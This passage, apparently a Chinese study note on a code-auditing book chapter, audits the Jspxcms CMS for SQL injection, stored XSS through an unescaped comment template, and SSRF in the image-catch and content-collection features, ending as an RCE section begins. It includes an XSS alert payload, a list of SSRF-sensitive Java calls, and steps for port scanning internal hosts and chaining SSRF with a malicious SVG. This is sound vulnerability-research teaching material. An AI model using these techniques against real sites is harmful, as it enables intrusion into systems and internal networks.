title="（2）用户名检查。"></a>（2）用户名检查。</h5><p>在注册账户时，常有检验用户名的功能，而将用户名带入数据库查询的过程中可能存在SQL注入的问题。core&#x2F;web&#x2F;back&#x2F;UserController#checkUsername中有一段检查用户名是否存在的代码，如下所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051312620.png" alt="image-20220505131233457"></p><p>service是UserService接口的实例，该接口的具体实现是UserServiceImplusernameExist()方法调用了dao. countByUsername()方法来完成具体的功能。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051322126.png" alt="image-20220505132231997"></p><p>dao是UserDao接口的实例，在UserDao中对countByusername()方法的定义中使用占位符的方式构造SQL语句，不存在SQL注入的问题。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051324967.png" alt="image-20220505132402826"></p><p>对本套CMS的几个功能点进行审查时，在数据库交互的过程中采用了安全的编码方式，未发现SQL注入漏洞。在挖掘SQL注入的过程中，用全局搜索关键字可以快速发现可能存在的漏洞点，常需要回溯找到上一级调用点，理清变量的传递过程，从而确定漏洞是否真实存在。而定点功能的审计大多从功能点的入口开始，逐步递进到SQL语句执行的部分，这是一个正向推理的过程。</p><h3 id="8-5-2-XSS-审计"><a href="#8-5-2-XSS-审计" class="headerlink" title="8.5.2　XSS 审计"></a>8.5.2　XSS 审计</h3><p>下面介绍对Jspxcms的存储型XSS漏洞的挖掘过程。我们所运用的经验是：网站的评论区往往是存储型XSS漏洞的“重灾区”，若研发人员未能对评论数据同时做好“输入校验、过滤”以及“输出转义”，则很容易受到存储型XSS的危害。因此在审计时，我们将把“输入点”与“输出点”作为关注对象。</p><p>首先来检查“输入点”，为了快速定位到提交评论数据的接口，可以采用BurpSuite抓取普通用户在Info页面提交评论数据的请求包（我们在网友评论框内填写了XSS的payload“<script>alert("carpe diem")</script>”），如图8-20所示。</p><p>由图8-20可知，在普通用户提交评论时，访问的接口是“POST&#x2F;comment_submit”。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051343355.png" alt="image-20220505134334192">为了快速找到接口对应的方法，我们可以在代码中搜索字符串“comment_submit”，如图8-21所示，该接口的实现代码是控制器类CommentController中的方法submit<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051345938.png" alt="image-20220505134501772"></p><p>图8-21　搜索字符串</p><p>而该submit方法未对用户提交的评论内容变量text进行参数校验与过滤，就将Comment对象属性text的值赋为变量text的值。紧接着，第205行的“CommentService.save接口的实现类对象”的save方法调用Comment对象，如图8-22所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051348895.png" alt="image-20220505134852740"></p><p>图8-22　save方法调用Comment对象</p><p>看到的save是service里面的</p><p>我们接着看看引用库<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051351557.png" alt="image-20220505135148422"></p><p>可以看的这个commentservice既有comment又有service</p><p>查一查 <img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051354078.png" alt="image-20220505135411920"></p><p>先看到CommentService.java 进去搜索save <img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051354639.png" alt="image-20220505135440497"></p><p>发现这个是用来定义函数格式的。所以说依此判定CommentService的实现类是CommentServiceImpl</p><p>对接口CommentService的实现类CommentServiceImpl的save方法进行审计，如图8-23所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051355846.png" alt="image-20220505135553686"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051357834.png" alt="image-20220505135731703"></p><p>图8-23　审计save方法</p><p>由图8-23可知，该方法调用了“CommentDao接口的实现类的对象”的save方法，继续审计该方法，可以发现算法直接将Comment对象存入了数据库，如图8-24所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051359974.png" alt="image-20220505135901823"></p><p>图8-24　算法直接将Comment对象存入了数据库</p><p>通过上述分析可知，用户评论功能这一输入点并未对输入数据进行参数校验或过滤，这为XSS漏洞的触发埋下了隐患。</p><p>但比较遗憾的是，在存入恶意数据时，我们并不能在info页面看到预期的XSS弹窗，只可以猜测该网站已经在“输出点”（表现层）进行了转义工作。如图8-25所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051402155.png" alt="image-20220505140246967"></p><p>图8-25　猜测网站进行了转义工作</p><p>接着，让我们来检查“输出点”。为了确定表现层采用了何种模板引擎，我们可以在该Maven工程的pom.xml文件中进行审计。由图8-26可知，该网站采用了模板引擎“Freemarker”。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051404701.png" alt="image-20220505140424524"></p><p>图8-26　网站采用了模板引擎“Freemarker”</p><p>当我在互联网上查阅与Freemarker的“转义”相关的开发文档时，无意发现了Jspxcms对Freemarker转义的说明，如图8-27所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051405372.png" alt="image-20220505140512215"></p><p>图8-27　Jspxcms对Freemarker转义的说明</p><p>果不其然，我们在Info页面的模板文件Jspxcms\src\main\webapp\template\1\ default\info_news.html中发现了转义的写法，如图8-28所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051407465.png" alt="image-20220505140729292"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051410229.png" alt="image-20220505141002014"></p><p>图8-28　Info页中转义的写法</p><p>通过上述分析可知，Info页面的这一输入点已经做了“输出转义”，这阻止了XSS漏洞的触发</p><p>虽然Info页面已经做了“输出转义”的工作，那么是否会有其他模板未做转义工作呢？检查模板文件(在同目录下查找)，可以发现模板文件Jspxcms\src\main\webapp\template\1\default\sys_member_space_comment.html未做转义输出，如图8-29所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051422154.png" alt="image-20220505142231997"></p><p>继续在源码中搜索文件名“sys_member_space_comment.html”，可以发现同目录下的模板文件sys_member_space.html恰好引用了sys_member_space_comment.html，如图8-30所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051423663.png" alt="image-20220505142313468"></p><p>接着，我们还可以在模板文件sys_member_space.html中找到如下关键代码，如图8-31所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051423153.png" alt="image-20220505142357961"></p><p>图8-31　在模板文件中的关键代码</p><p>这段代码进行了以下处理：当HTTP请求参数type的值为comment时，动态引用了sys_member_space_comment.html文件；</p><p>&#x3D;&#x3D;可以看到在 sys_member_space.html 下参数 type 等于 comment 那么 sys_member_space_comment.html 就会被包含 。&#x3D;&#x3D;</p><p>寻找使用该模板的控制器类，继续在源码中搜索“sys_member_space.html”，如图8-32所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051424558.png" alt="image-20220505142448411"></p><p>图8-32　继续在源码中搜索</p><p>由图8-32可知，控制器类&#x2F;fore&#x2F;MemberController中的常量的值正好是字符串“sys_member_space.html”。可以看到文件名被定义为常量，&#x3D;&#x3D;space 方法使用了该常量，也就是说访问路径的格式为 &#x2F;space&#x2F;{id} 时就能触发 XSS 了。&#x3D;&#x3D;<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051425973.png" alt="image-20220505142543815"></p><p>接着在源码中搜寻常量“SPACE_TEMPLATE”，可知接口“GET &#x2F;space&#x2F;{id}”使用了该模板，并且请求参数id是普通用户可控的。我们找到了该存储型XSS漏洞的“输出触发点”，如图8-33所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051433032.png" alt="image-20220505143311849"></p><p>测试结果如图8-34所示，弹窗成功！这说明我们成功挖掘到了此处的XSS漏洞。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051439605.png" alt="image-20220505143906424"></p><p>图8-34　测试结果显示成功挖掘到XSS漏洞</p><p>比较有趣的是，我们可以通过软件Beyond Compare发现，新版本已经对该模板进行了转义处理，以修复漏洞，如图8-35所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051439255.png" alt="image-20220505143930000"></p><p>图8-35　新版本已经对模板进行了转义处理</p><h3 id="8-5-3-SSRF审计"><a href="#8-5-3-SSRF审计" class="headerlink" title="8.5.3　SSRF审计"></a>8.5.3　SSRF审计</h3><p>审计 SSRF 时需要注意的敏感函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">URL.openConnection()<br>URL.openStream()<br>HttpClient.execute()<br>HttpClient.executeMethod()<br>HttpURLConnection.connect()<br>HttpURLConnection.getInputStream()<br>HttpServletRequest()<br>BasicHttpEntityEnclosingRequest()<br>DefaultBHttpClientConnection()<br>BasicHttpRequest()<br></code></pre></td></tr></table></figure><p>可能出现SSRF漏洞点的站点功能。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">内容管理中的文档属性。<br>文件管理中的上传文件。<br>模块组件功能中的采集管理。<br>插件功能中的广告管理。<br></code></pre></td></tr></table></figure><p>可能出现SSRF 漏洞点的功能目录如下。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.jspxcms</span><span class="hljs-selector-class">.common</span> ip：通过IP地址查询实际地址的逻辑代码。<br>com<span class="hljs-selector-class">.jspxcms</span><span class="hljs-selector-class">.common</span> – web：Spring MVC等Web相关类。<br>com<span class="hljs-selector-class">.jspxcms</span><span class="hljs-selector-class">.core</span> – domain：实体类代码。<br>com<span class="hljs-selector-class">.jspxcms</span><span class="hljs-selector-class">.core</span> – service：服务层代码。<br>com<span class="hljs-selector-class">.jspxcms</span><span class="hljs-selector-class">.core</span> – web：Controller层代码。<br>com<span class="hljs-selector-class">.jspxcms</span>.ext：扩展模块代码。<br>com<span class="hljs-selector-class">.jspxcms</span>.plug：插件模块代码。<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">在com<span class="hljs-selector-class">.jspxcms</span><span class="hljs-selector-class">.common</span> ip中，其主要代码的逻辑是通过IP地址查询实际地址。因此可能对传入的IP地址进行 URL 反查，并存在内部http请求，因此猜测其可能出现 SSRF漏洞。<br><br>在com<span class="hljs-selector-class">.jspxcms</span><span class="hljs-selector-class">.common</span> —— web中，其主要代码是Spring MVC等Web相关类，其中可能存在自定义的与 http 请求相关的函数，因此猜测其可能出现SSRF漏洞。<br><br>在com<span class="hljs-selector-class">.jspxcms</span><span class="hljs-selector-class">.core</span> —— domain中，其主要代码逻辑是实体类代码，其中可能存在自定义的与 http 请求相关的函数，因此猜测其可能出现 SSRF漏洞。<br><br>在com<span class="hljs-selector-class">.jspxcms</span><span class="hljs-selector-class">.core</span> —— service中，其主要代码逻辑是服务层代码，其中可能存在自定义的与 http 请求相关的函数，因此猜测其可能出现 SSRF漏洞。<br><br>在com<span class="hljs-selector-class">.jspxcms</span><span class="hljs-selector-class">.core</span> —— Web 中，其主要代码逻辑是Controller层代码，其中可能存在自定义的与 http 请求相关的函数，因此猜测其可能出现 SSRF漏洞。<br><br>在com<span class="hljs-selector-class">.jspxcms</span><span class="hljs-selector-class">.ext</span> 中，其主要代码逻辑是扩展模块的相关功能，其中可能存在自定义的与 http 请求相关的函数，因此猜测其可能出现 SSRF漏洞。<br><br>在com<span class="hljs-selector-class">.jspxcms</span>.plug中，其主要代码逻辑是插件模块的相关功能，其中可能存在自定义的与 http 请求相关的函数，因此猜测其可能出现 SSRF漏洞。<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs">在内容管理的文档属性功能点中，存在上传图片的功能，图片上传可能从远程加载或获取，对于远程加载或获取的功能点，可能存在 SSRF 漏洞。<br><br>在文件管理的上传文件功能点中，存在上传图片的功能，图片上传可能从远程加载或获取，对于远程加载或获取的功能点，可能存在 SSRF 漏洞。<br><br>在模块组件功能的采集管理功能点中，存在采集其他网站新闻的功能，该功能可能从远程加载或获取，对于远程加载或获取的功能点，可能存在 SSRF 漏洞。<br><br>在插件功能的广告管理功能点中，存在上传图片的功能，图片上传可能从远程加载或获取，对于远程加载或获取的功能点，可能存在 SSRF 漏洞。<br></code></pre></td></tr></table></figure><p>以上功能目录和功能点只是审计者审计之前的猜测，在正式审计挖掘漏洞时，用户可以首先对于猜测点进行审计。由于篇幅有限这里不再具体叙述所有功能点的审计，只列举部分功能点的审计过程。</p><h4 id="1．com-jspxcms-core-——-Web-审计"><a href="#1．com-jspxcms-core-——-Web-审计" class="headerlink" title="1．com.jspxcms.core —— Web 审计"></a>1．com.jspxcms.core —— Web 审计</h4><p>这个功能目录是站点的核心功能，因此优先针对该功能目录进行审计。审计方法可以是逐行阅读，也可以在该目录下搜索关键函数和关键类。如6.2节中提到的 SSRF漏洞敏感函数表，我们可以逐一搜索，查询是否存在相关类或函数。如这里我们发现了HttpURLConnection类，如图8-36 所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051510316.png" alt="image-20220505151005077"></p><p>图8-36　搜索相关类或函数</p><p>搜索可知一个文件中存在该类，在 UploadControllerAbstract.java 文件第144行传入了一个src变量，并进行了openConnection()连接。打开该文件，看看这个src.openconnection在哪个类</p><p>定位到ueditorCatchImage() 函数，该函数具体内容如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ueditorCatchImage</span><span class="hljs-params">(Site site, HttpServletRequest request,</span><br><span class="hljs-params">                                  HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>     <span class="hljs-type">GlobalUpload</span> <span class="hljs-variable">gu</span> <span class="hljs-operator">=</span> site.getGlobal().getUpload();<br>     <span class="hljs-type">PublishPoint</span> <span class="hljs-variable">point</span> <span class="hljs-operator">=</span> site.getUploadsPublishPoint();<br>     <span class="hljs-type">FileHandler</span> <span class="hljs-variable">fileHandler</span> <span class="hljs-operator">=</span> point.getFileHandler(pathResolver);<br>     <span class="hljs-type">String</span> <span class="hljs-variable">urlPrefix</span> <span class="hljs-operator">=</span> point.getUrlPrefix();<br><br>     <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;&#123;\&quot;state\&quot;: \&quot;SUCCESS\&quot;, list: [&quot;</span>);<br>     List&lt;String&gt; urls = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;String&gt;();<br>     List&lt;String&gt; srcs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;String&gt;();<br><br>     String[] source = request.getParameterValues(<span class="hljs-string">&quot;source[]&quot;</span>);<br>     <span class="hljs-keyword">if</span> (source == <span class="hljs-literal">null</span>) &#123;<br>         source = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">0</span>];<br>     &#125;<br>     <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; source.length; i++) &#123;<br>         <span class="hljs-type">String</span> <span class="hljs-variable">src</span> <span class="hljs-operator">=</span> source[i];<br>         <span class="hljs-type">String</span> <span class="hljs-variable">extension</span> <span class="hljs-operator">=</span> FilenameUtils.getExtension(src);<br>         <span class="hljs-comment">// 格式验证</span><br>         <span class="hljs-keyword">if</span> (!gu.isExtensionValid(extension, Uploader.IMAGE)) &#123;<br>             <span class="hljs-comment">// state = &quot;Extension Invalid&quot;;</span><br>             <span class="hljs-keyword">continue</span>;<br>         &#125;<br>         HttpURLConnection.setFollowRedirects(<span class="hljs-literal">false</span>);<br>         <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> (HttpURLConnection) <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(src).openConnection();<br>         <span class="hljs-keyword">if</span> (conn.getContentType().indexOf(<span class="hljs-string">&quot;image&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>             <span class="hljs-comment">// state = &quot;ContentType Invalid&quot;;</span><br>             <span class="hljs-keyword">continue</span>;<br>         &#125;<br>         <span class="hljs-keyword">if</span> (conn.getResponseCode() != <span class="hljs-number">200</span>) &#123;<br>             <span class="hljs-comment">// state = &quot;Request Error&quot;;</span><br>             <span class="hljs-keyword">continue</span>;<br>         &#125;<br>         <span class="hljs-type">String</span> <span class="hljs-variable">pathname</span> <span class="hljs-operator">=</span> site.getSiteBase(Uploader.getQuickPathname(Uploader.IMAGE, extension));<br>         <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>         <span class="hljs-keyword">try</span> &#123;<br>             is = conn.getInputStream();<br>             fileHandler.storeFile(is, pathname);<br>         &#125; <span class="hljs-keyword">finally</span> &#123;<br>             IOUtils.closeQuietly(is);<br>         &#125;<br>         <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> urlPrefix + pathname;<br>         urls.add(url);<br>         srcs.add(src);<br>         result.append(<span class="hljs-string">&quot;&#123;\&quot;state\&quot;: \&quot;SUCCESS\&quot;,&quot;</span>);<br>         result.append(<span class="hljs-string">&quot;\&quot;url\&quot;:\&quot;&quot;</span>).append(url).append(<span class="hljs-string">&quot;\&quot;,&quot;</span>);<br>         result.append(<span class="hljs-string">&quot;\&quot;source\&quot;:\&quot;&quot;</span>).append(src).append(<span class="hljs-string">&quot;\&quot;&#125;,&quot;</span>);<br>     &#125;<br>     <span class="hljs-keyword">if</span> (result.charAt(result.length() - <span class="hljs-number">1</span>) == <span class="hljs-string">&#x27;,&#x27;</span>) &#123;<br>         result.setLength(result.length() - <span class="hljs-number">1</span>);<br>     &#125;<br>     result.append(<span class="hljs-string">&quot;]&#125;&quot;</span>);<br>     logger.debug(result.toString());<br>     response.getWriter().print(result.toString());<br> &#125;<br><br></code></pre></td></tr></table></figure><p>经过仔细阅读可知，该函数的功能是获取并下载远程URL 图片。首先传入source[]变量，然后利用getExtension判断传入的URL文件扩展名，若是图片类型的文件，则修改文件名并保存到指定路径，最终反馈到页面上。</p><p>可以看到，该函数中对于传入的 URL 并没有进行过滤，在得到 URL的值后，直接带入openConnection()，造成了 SSRF 漏洞。但是上述代码中将openConnection()返回的对象强制转换为HttpURLConnection，<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051529723.png" alt="image-20220505152942541">如果传入的是非 http 或 https 协议，则会报错，如图8-37 所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051529259.png" alt="image-20220505152950072"></p><p>图8-37　强制转换对象</p><p>因此，该SSRF可以利用http或https协议去扫描端口或探测内网服务。</p><p>如果确定功能点存在漏洞，下一步就是寻找该代码对应的路径和功能点的位置。</p><p>直接点击这个<code>两个用法</code><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051550600.png" alt="image-20220505155009420"></p><p>我们发现ueditorCatchImage()函数在UploadController.java中被调用，如图8-38所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051550762.png" alt="image-20220505155018593"></p><p>跟踪发现调用该函数的是ueditorCatchImage()方法，如图8-39所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051550254.png" alt="image-20220505155045075"></p><p>图8-39　调用函数的方法</p><p>再点击这个图的<code>一个用法</code>发现在同文件的第58~66行中，在&#x2F;ueditor.do页面，当传入的参数为catchimage时，调用了ueditorCatchImage()方法，如图8-40所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051551704.png" alt="image-20220505155144506"></p><p>图8–40　传入参数时调用的方法</p><p>因此找到对应路径，传入所利用的参数，具体如图8-41所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051555122.png" alt="image-20220505155550942"></p><p>图8-41　传入所利用的参数</p><p>可以发现当该端口开放时，页面返回的内容带有 SUCCESS 字符。若是该端口未开放则返回 500 错误，如图8-42所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051556955.png" alt="image-20220505155605782"></p><p>图8-42　端口未开放则返回500错误</p><p>此外，由于该功能点的特殊性——ueditorCatchImage()函数功能是获取并下载远程URL 图片，因此我们可以制作一个&#x3D;&#x3D;含有XSS脚本的SVG图片&#x3D;&#x3D;，该图片内容如图8-43所示。</p><p>图8-43　含有XSS脚本的SVG图片</p><p>然后将该文件放到指定网址上，如这里将该文件命名为poc.svg，并将其放在Apache 服务器的ctf文件目录下，然后传入该地址，如图8-44所示。</p><p>可以看到远程下载成功，并返回了路径，访问该地址即可触发 XSS 漏洞，如图8-45所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051601746.png" alt="image-20220505160004954"></p><p>图8-44　将图片文件放在指定网址上<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051600484.png" alt="image-20220505160035309"></p><p>图8-45　测试成功</p><h4 id="2．模块组件功能-——-采集管理审计"><a href="#2．模块组件功能-——-采集管理审计" class="headerlink" title="2．模块组件功能 —— 采集管理审计"></a>2．模块组件功能 —— 采集管理审计</h4><p>对于功能点的审计和功能目录的审计略有不同，首先是要确定该功能点在站点的位置，了解其具体功能，如图8-46所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051601239.png" alt="image-20220505160123080"></p><p>图8-46　确定功能点在站点的位置</p><p>在站点后台的模块组件——采集管理页面，是该功能的界面，接着对初始化数据进行修改，如图8-47所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051601744.png" alt="image-20220505160150560"></p><p>图8-47　修改初始化数据</p><p>我们可以对列表地址和文章 URL 地址进行设置，单击“文章 URL 地址”的“设置”按钮，弹出新页面，如图8-48所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051603091.png" alt="image-20220505160329850"></p><p>图8-48　设置文章URL地址</p><p>可以看到该功能是获取远程 URL地址的html 源码页面，并且将源码输出到页面上。我们可以尝试修改采集的 URL 地址，如图8-49所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051605691.png" alt="image-20220505160554519"></p><p>图8-49　尝试修改采集的URL地址</p><p>至此，基本上可以断定此处功能点存在 SSRF 漏洞。因为该功能没有对于采集的URL进行限定，导致可以采集任意URL地址，并利用该功能点来遍历内网服务、扫描端口等</p><p>确定存在漏洞后，再寻找对应的代码文件。首先全局搜索list_pattern_dialog.do，如图8-50所示，定位到&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;jspxcms&#x2F;ext&#x2F;web&#x2F;back&#x2F;CollectController.java文件，接着定位到listPatternDialog()函数。代码内容如下所示。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;list_pattern_dialog.do&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">listPatternDialog</span><span class="hljs-params">(String listPattern, Integer pageBegin, Integer pageEnd, String charset,</span><br><span class="hljs-params">String userAgent, String areaId, String itemId, <span class="hljs-meta">@RequestParam(defaultValue = &quot;true&quot;)</span> <span class="hljs-type">boolean</span> desc,</span><br><span class="hljs-params">org.springframework.ui.Model modelMap)</span> <span class="hljs-keyword">throws</span> ClientProtocolException, IOException &#123;<br>List&lt;String&gt; urls = Collect.getListUrls(listPattern, pageBegin, pageEnd, desc);<br>modelMap.addAttribute(<span class="hljs-string">&quot;urls&quot;</span>, urls);<br>modelMap.addAttribute(<span class="hljs-string">&quot;charset&quot;</span>, charset);<br>modelMap.addAttribute(<span class="hljs-string">&quot;userAgent&quot;</span>, userAgent);<br>modelMap.addAttribute(<span class="hljs-string">&quot;areaId&quot;</span>, areaId);<br>modelMap.addAttribute(<span class="hljs-string">&quot;itemId&quot;</span>, itemId);<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ext/collect/collect_pattern_dialog&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到listPatternDialog()函数将获取的参数提交到了&#x2F;src&#x2F;main&#x2F;webapp&#x2F;WEB-INF&#x2F;views&#x2F;ext&#x2F;collect&#x2F;collect_pattern_dialog.JSP页面。&#x3D;&#x3D;因为是文件名，直接双shift查找&#x3D;&#x3D;  <img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051618397.png" alt="image-20220505161845162">根据提示jsp中遍历学着urls charset userAgent这些</p><p>跟踪该页面发现页面将参数传递给了fetch_url.do处理，如图8-51所示<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051615758.png" alt="image-20220505161555550"></p><p>图8-51　页面处理了获取的参数</p><p>全局搜索该地址，如图8-52所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051616224.png" alt="image-20220505161645039"></p><p>搜索结果定位到&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;jspxcms&#x2F;ext&#x2F;web&#x2F;back&#x2F;CollectController.java文件第243行的fetchUrl()函数，如图8-53所示<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051624525.png" alt="image-20220505162254829"></p><p>图8-53　定位到的函数</p><p>发现该函数将参数再次传入了fetchHtml()方法，继续跟踪该方法，定位到src&#x2F;main&#x2F;java&#x2F;com&#x2F;jspxcms&#x2F;ext&#x2F;domain&#x2F;Collect.java ，如图8-54所示<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051625970.png" alt="image-20220505162518628"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051630461.png" alt="image-20220505162742059"></p><p>图8-54　定位到的方法</p><p>我们发现在fetchHtml()方法中调用了重写的fetchHtml()方法，在该重写方法中通过get的方式获取URL 对象，并将其最终直接传入&#x3D;&#x3D;httpclient.execute()&#x3D;&#x3D;函数，构成SSRF 漏洞。</p><p>httpclient.execute()是ssrf的敏感函数 所以我们一开始直接搜索httpclient.execute()也恩看到fetchhtml<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051630081.png" alt="image-20220505162913442"></p><p>我们可以直接访问fetch_url.do页面来测试 SSRF 漏洞，如图8-55所示，能够直接访问内部网络的服务<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051631635.png" alt="image-20220505163119979"></p><p>至此，SSRF漏洞挖掘完成。</p><h3 id="8-5-4-RCE审计"><a href="#8-5-4-RCE审计" class="headerlink" title="8.5.4　RCE审计"></a>8.5.4　RCE审计</h3><p>在审计RCE漏洞时，首先要观察该项目所依赖的第三方Jar包，目的是了解项目有没有使用包含已知漏洞的第三方组件，如果使用了，那么参数是否可控也是我们需要确定的。</p><p>经过观察，从项目中挑选出以下几个第三方库，如图8-56所示。<img 